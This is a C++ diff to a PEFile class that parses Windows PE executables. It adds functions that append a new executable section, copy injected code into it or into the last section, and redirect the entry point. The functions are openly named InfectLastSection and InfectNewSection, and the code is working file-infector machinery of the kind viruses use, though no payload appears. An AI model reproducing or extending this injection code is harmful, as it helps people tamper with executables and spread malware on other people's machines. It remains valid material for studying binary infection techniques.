@@ -83,7 +83,7 @@ void PEFile::LoadFile(void)
 	if (!file.good() || file.gcount() != m_fileSize)
 		throw std::runtime_error("PEFile::LoadFile - Error reading the file.");
 }
-void PEFile::Infect(char const* code, size_t size, DWORD originalEntryPointOffset, DWORD entryPointOffset)
+void PEFile::InfectLastSection(char const* code, size_t size, DWORD originalEntryPointOffset, DWORD entryPointOffset)
 {
 	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
 	char* newCodePointer = m_fileBuffer + lastSection->PointerToRawData + lastSection->Misc.VirtualSize; // pointer to the beggining of injected code
@@ -97,6 +97,11 @@ void PEFile::Infect(char const* code, size_t size, DWORD originalEntryPointOffse
 	lastSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
 	ExpandLastSection(size);
 }
+void PEFile::InfectNewSection(char const* sectionName, char const* code, size_t size, DWORD originalEntryPointOffset, DWORD newEntryPointOffset)
+{
+	AddSection(sectionName, size);
+	InfectLastSection(code, size, originalEntryPointOffset, newEntryPointOffset);
+}
 void PEFile::ExpandLastSection(size_t size)
 {
 	IMAGE_SECTION_HEADER* lastSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections - 1;
@@ -107,13 +112,57 @@ void PEFile::ExpandLastSection(size_t size)
 	size_t newVirtualSize = lastSection->Misc.VirtualSize + size;
 	if (newVirtualSize > lastSection->SizeOfRawData)
 	{
-		size_t alignedSize = AlignSize(lastSection->Misc.VirtualSize + size, m_ntHeaders->OptionalHeader.FileAlignment);
+		size_t alignedSize = Tools::AlignSize(lastSection->Misc.VirtualSize + size, m_ntHeaders->OptionalHeader.FileAlignment);
 		lastSection->SizeOfRawData = alignedSize;
 
-		m_fileSize += AlignSize(alignedSize, m_ntHeaders->OptionalHeader.SectionAlignment);
+		m_fileSize += Tools::AlignSize(alignedSize, m_ntHeaders->OptionalHeader.SectionAlignment);
 	}
 	lastSection->Misc.VirtualSize += size;
 	m_ntHeaders->OptionalHeader.SizeOfImage = lastSection->VirtualAddress + lastSection->Misc.VirtualSize;
+}
+void PEFile::AddSection(char const* name, size_t size)
+{
+	if (strlen(name) > 8)
+		throw std::runtime_error("PEFile::AddSection - Section name is too long.");
+	for (int i = 0; i < m_ntHeaders->FileHeader.NumberOfSections; i++)
+	{
+		if (strcmp(reinterpret_cast<char*>(m_firstSectionHeader[i].Name), name) == 0)
+			throw std::runtime_error("PEFile::AddSection - Section with this name already exists.");
+	}
+	IMAGE_SECTION_HEADER* newSection = m_firstSectionHeader + m_ntHeaders->FileHeader.NumberOfSections;
+	IMAGE_SECTION_HEADER* lastSection = newSection - 1;
+
+	if (((m_fileBuffer + m_firstSectionHeader->PointerToRawData) - reinterpret_cast<char*>(newSection)) < sizeof(IMAGE_SECTION_HEADER))
+		throw std::runtime_error("PEFile::AddSection - Not enough space for another section header.");
+	
+	size_t sectionAligned = Tools::AlignSize(size, m_ntHeaders->OptionalHeader.SectionAlignment);
+	if (m_fileSize + sectionAligned > m_bufferSize)
+		ReallocateBuffer((m_fileSize + sectionAligned) * 2);
+
+	memset(newSection, 0, sizeof(IMAGE_SECTION_HEADER)); //just incase
+	memcpy(newSection->Name, name, strlen(name));
+
+	newSection->Misc.VirtualSize = 0;
+	newSection->SizeOfRawData = Tools::AlignSize(size, m_ntHeaders->OptionalHeader.FileAlignment);
+	newSection->PointerToRawData = lastSection->PointerToRawData + lastSection->SizeOfRawData;
+	newSection->VirtualAddress = lastSection->VirtualAddress + Tools::AlignSize(lastSection->Misc.VirtualSize, m_ntHeaders->OptionalHeader.FileAlignment); // as some section have virtualSize > rawSize, we align virtual size instead of using rawSize
+
+	newSection->Characteristics |= IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
+	m_ntHeaders->FileHeader.NumberOfSections++;
+	m_ntHeaders->OptionalHeader.SizeOfImage = newSection->VirtualAddress + newSection->Misc.VirtualSize;
+	m_fileSize += sectionAligned;
+}
+void PEFile::WriteSection(char const* code, size_t size, int sectionIndex, DWORD writeOffset)
+{
+	if (sectionIndex >= m_ntHeaders->FileHeader.NumberOfSections)
+		throw std::runtime_error("PEFile::WriteSection - Section index out of bounds.");
+
+	IMAGE_SECTION_HEADER* section = m_firstSectionHeader + sectionIndex;
+
+	if (writeOffset + size > section->Misc.VirtualSize)
+		throw std::runtime_error("PEFile::WriteSection - Not enough space in the section");
+
+	memcpy(m_fileBuffer + section->PointerToRawData + writeOffset, code, size);
 }
 void PEFile::ReallocateBuffer(size_t size)
 {
@@ -150,7 +199,7 @@ size_t PEFile::GetNumberOfSections(void) const
 {
 	return m_ntHeaders->FileHeader.NumberOfSections;
 }
-size_t PEFile::AlignSize(size_t size, size_t alignment)
+size_t PEFile::Tools::AlignSize(size_t size, size_t alignment)
 {
 	size_t alignedSize = alignment;
 	while (alignedSize < size)
@@ -159,7 +208,6 @@ size_t PEFile::AlignSize(size_t size, size_t alignment)
 	}
 	return alignedSize;
 }
-
 
 
 size_t PEFile::Tools::GetFunctionSize(void const* function)
